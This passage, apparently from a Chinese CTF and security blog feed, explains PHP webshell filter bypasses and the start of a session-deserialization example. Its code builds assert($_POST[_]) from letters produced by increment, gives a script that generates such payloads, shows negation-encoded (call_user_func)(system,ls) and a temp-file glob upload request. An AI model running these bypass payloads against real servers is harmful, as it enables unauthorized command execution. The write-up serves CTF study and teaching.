class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>php7下是反引号 进行反弹shell</p><h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>先来一个简单的代码来理解一下什么是自增</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;A&#x27;</span>;<br>++<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-comment">//运行结果是B</span><br></code></pre></td></tr></table></figure><p>这个++之前c语言的时候就学习过了 我们如果获取到了首字母A的话那么任意一个字母我们都可以通过自增的方法来获取</p><p>但是在无数字字母中我们不能有字母 那么该如何获取A呢？ 这里要用到了数组 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=[];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;   <span class="hljs-comment">//运行结果是Array</span><br></code></pre></td></tr></table></figure><p>但是我们获得的是整个数组 它并不是一个字符串 所以单一个字母A我们是拿不到的 这里在数组后面加一个’’ 这样就会被当作字符串了 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]; <br><span class="hljs-comment">//运行结果是A</span><br></code></pre></td></tr></table></figure><p>还有一个问题 既然是无数字字母的话 这个0就不应该有了 我们找一个不存在的变量 为假 也就是0 这样就可以代替了   然后变量名用_ 来代替</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-comment">//运行结果是A</span><br></code></pre></td></tr></table></figure><p>在php5中我们可以用<code>assert($_POST[_])</code> 来进行一个命令执行</p><p>然后这个assert和_POST  都可以利用自增进行构造出来</p><p>下面讲一下构造的思路 </p><p>上面的既然可以运算出A 我们也可以运算出S 前置是先把A这个值赋给几个变量 方便后续的构造</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];   这个三个下划线的被赋值成了A<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;  <br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;    <span class="hljs-regexp">//</span>然后两个下划线的和一个下划线的都被赋值成了A  这里是为什么 下面拼接的时候就能看出作用了 <br></code></pre></td></tr></table></figure><p>OK 下面就来构造S吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_</span>;<br>这个<span class="hljs-variable">$_</span> 就是S 上面那些就是一个增加的  从A到S<br></code></pre></td></tr></table></figure><p>然后先构造ASS   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$__</span>;<br></code></pre></td></tr></table></figure><p>如果我们要构造E的话首先要把$_ 重新定义成A 上面得$___ 它得值还没有变 根据这个 把<code>$_</code>重新定义成A</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$__</span>;<br><br></code></pre></td></tr></table></figure><p>下面的都是那样 就不再多说了</p><p>然后下面有一个自增构造的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-variable">$cmd2</span> = <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;post&#x27;</span>]);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">POC</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable">$POC_pat1</span> = <span class="hljs-string">&quot;\$__=\$___;&quot;</span>;<br>    <span class="hljs-variable">$POC_pat2</span> = <span class="hljs-string">&quot;\$_ .=\$__;&quot;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$POC1</span> = <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$str1</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>)-<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;A&quot;</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-variable">$POC_pat3</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat3</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str1</span>==<span class="hljs-variable">$str2</span>)&#123;<br>                <span class="hljs-variable">$POC_pat5</span> = <span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat5</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$POC_pat6</span> = <span class="hljs-variable">$POC_pat1</span>.<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>).<span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat6</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$i</span>++;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">POC2</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$____ = &quot;_&quot;;$__=$___;&#x27;</span>;<br>    <span class="hljs-variable">$POC_pat1</span> = <span class="hljs-string">&quot;\$__=\$___;&quot;</span>;<br>    <span class="hljs-variable">$POC_pat2</span> = <span class="hljs-string">&quot;\$____ .=\$__;&quot;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$POC1</span> = <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$str1</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>)-<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;A&quot;</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-variable">$POC_pat3</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>).<span class="hljs-variable">$POC_pat2</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat3</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str1</span>==<span class="hljs-variable">$str2</span>)&#123;<br>                <span class="hljs-variable">$POC_pat5</span> = <span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat5</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$POC_pat6</span> = <span class="hljs-variable">$POC_pat1</span>.<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>).<span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat6</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$i</span>++;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-variable">$POC_pat7</span> = <span class="hljs-string">&quot;\$_=[].&#x27;&#x27;;\$___=\$_[\$__];\$__=\$___;\$_=\$___;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat7</span>;<br>    <span class="hljs-title function_ invoke__">POC</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$cmd2</span>))&#123;<br>    <span class="hljs-title function_ invoke__">POC2</span>(<span class="hljs-variable">$cmd2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果要构造<code>assert($_POST[_])</code> 的话 就让cmd=assert post=POST</p><p>有四个下划线的是post的 一个下划线的是cmd的</p><h1 id="特殊符号过滤"><a href="#特殊符号过滤" class="headerlink" title="特殊符号过滤"></a>特殊符号过滤</h1><h3 id="1-对下划线进行一个过滤"><a href="#1-对下划线进行一个过滤" class="headerlink" title="1.对下划线进行一个过滤"></a><strong>1.对下划线进行一个过滤</strong></h3><p>这个可以利用短标签进行一个绕过</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`$_GET[_]`</span><span class="hljs-string">?&gt;</span>  可以将_GET进行一个取反 然后 将_也进行一个取反 <br><br>转换成=&gt;  <span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span>&#123;<span class="hljs-variable">$&#123;</span>~<span class="hljs-string">&quot;取反后的字符&quot;</span>&#125;[%a0]&#125;<span class="hljs-string">?&gt;</span>   然后就可以进行一个命令执行  同时改成<span class="hljs-variable constant_">POST</span>也是可以的 只不过将后面的参数换成一个 - 号就行了<br></code></pre></td></tr></table></figure><p>当然异或也是可以的</p><h3 id="2-下划线和-被过滤了"><a href="#2-下划线和-被过滤了" class="headerlink" title="2.下划线和$被过滤了"></a><strong>2.下划线和$被过滤了</strong></h3><p><strong>php7下：</strong></p><p>利用函数<strong>call_user_func()</strong>  进行一个绕过   只在php7后有效($a)();</p><p>call_user_func(‘调用的函数’,’传入的值’)</p><p>对它进行一个取反绕过</p><p>call_user_func =&gt; %9C%9E%93%93%A0%8A%8C%9A%8D%A0%99%8A%91%9C</p><p>system =&gt; %8C%86%8C%8B%9A%92</p><p>ls =&gt; %93%8C</p><p>(<del>%9C%9E%93%93%A0%8A%8C%9A%8D%A0%99%8A%91%9C)(</del>%8C%86%8C%8B%9A%92,~%93%8C);  =&gt;(call_user_func)(system,ls);</p><p><img src="https://s2.loli.net/2023/08/25/9kGCNawZQonDh1U.png" alt="image-20230707160430309.png"></p><p><strong>在php5下：</strong></p><p>利用了一个上传临时文件</p><p>参考大佬博客：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>. file(文件名) 是用来执行一个文件的  </p><p>这个在php5下的绕过思路就是 上传一个文件 php会将我们上传的文件默认保存在/tmp/phpxxxxxx目录下 （xxxxxx 是六个随机的大小写字母）</p><p>然后我们通过通配符? 利用.file 去读取我们上传的文件  这个上传的文件是可控的 所以就可以进行命令执行   大体思路就是这个</p><p>? 代表任意一个字符    </p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-string">``</span>可以用来进行命令执行     <span class="hljs-string">`./???/?????????`</span><br></code></pre></td></tr></table></figure><p>但是这个有不可预知性 可以查的范围太广了    我们注意到后面的xxxxxx是六位随机的大小写字母 在linux中 glob支持利用 [0-9]来表示一个范围</p><p>在ascii码表中  @-[  表示所有大写字母的范围 所以可以利用  [@-[]   我们可以让最后一位是大写的然后这样范围就进一步的缩小了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">`.<span class="hljs-regexp">/???/</span>?????[@-[]`<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/25/6l8qaihbTgDzH4P.png" alt="image-20230707175309732.png"></p><p>从User-Agent到最后的话可以复制粘贴</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">79.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">79.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/webp,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Content-Type:multipart/form-data;boundary=--------123</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment">Content-Length: 115</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">----------123</span><br><span class="hljs-comment">Content-Disposition:form-data;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-comment">ls /     //进行命令执行</span><br><span class="hljs-comment">----------123--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h3 id="3-过滤了-amp"><a href="#3-过滤了-amp" class="headerlink" title="3.过滤了~^|;`&amp;"></a><strong>3.过滤了~^|;`&amp;</strong></h3><p>这个时候要用到自增 和短标签结合起来的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">32</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">127</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)))&#123;   <span class="hljs-comment">//这个正则看题目是什么</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>).<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>&#125;<br>?    可以看看没有过滤哪些<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Session反序列化</title>
    <link href="/2023/08/23/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/08/23/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a>Session反序列化</h1><p>具体的什么是session,php session的工作机制是什么，可以参考下面这篇文章：<br><a href="https://xz.aliyun.com/t/6640">https://xz.aliyun.com/t/6640</a></p><p>先来介绍一下session。session是储存在服务器端的数据，相对比cookie来讲更加的安全，因为cookie是储存在客户端的数据。</p><p>​                                              先来看一下几个参数的含义:</p><table><thead><tr><th>Directive</th><th></th></tr></thead><tbody><tr><td>session.save_handler</td><td>session保存形式，默认为files</td></tr><tr><td>session.save_path</td><td>session保存路径</td></tr><tr><td>session.serialize_handler</td><td>session序列化存储所用处理器，默认为php</td></tr><tr><td>session.upload_progress.cleanup</td><td>一旦读取了所有的POST数据，立即清除进度信息。默认开启</td></tr><tr><td>session.upload_progress.enabled</td><td>将上传文件的进度信息存在session中，默认开启</td></tr></tbody></table><p>session反序列漏洞产生的原因就是写入和读取的内容不一样  (就是使用了不同的处理器)</p><p>在php中session有三种反序列化的机制，分别是</p><p><strong>1.php 2.php_serialize 3.php_binary</strong></p><p>它们的序列化的结果是不一样的，下面分别介绍一下。</p><p>1.php ——&gt;键名＋竖线＋经过serialize()函数序列化之后的值</p><p>2.php_serialize ——&gt; 经过serialize()函数序列化处理的数组   使用这个php版本需要大于5.5.4</p><p>3.php_binary ——&gt;  键名长度对应的ASCII码＋键名＋经过serialize()函数序列化后的值  </p><p>比如说：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[name]=<span class="hljs-string">&#x27;jj&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>1.php  ——&gt;name|s:2:”jj”;</p><p>2.php_serialzie ——&gt;a:1:{s:4:”name”;s:2:”jj”;}</p><p>3.php_binary ——&gt; EOTnames:2:”jj”;</p><p>下面举一个简单的例子来说明一下session反序列化的应用</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*hint.php*/</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;her=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;name===<span class="hljs-variable language_">$this</span>-&gt;her)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里面hint.php代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在index.php中 没有可以输入的点，但是有一个session_start(),可以对session进行一个读取</p><p>然后在hint.php中是一个写入session的，这里写入使用了php_serialize 读取使用了php</p><p>根据它们对session序列化的不同，可以构造恶意的代码，从而去获得flag</p><p>既然读取是php，它会将|后面的内容进行一个反序列化，所以我们可以在序列化好的字符串前面加上一个|</p><p>那么来看这个简单的Flag类，这里利用了引用，就是在某些情况下，两个值不同但获取flag的前提是两个值相同</p><p>所以可以构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span 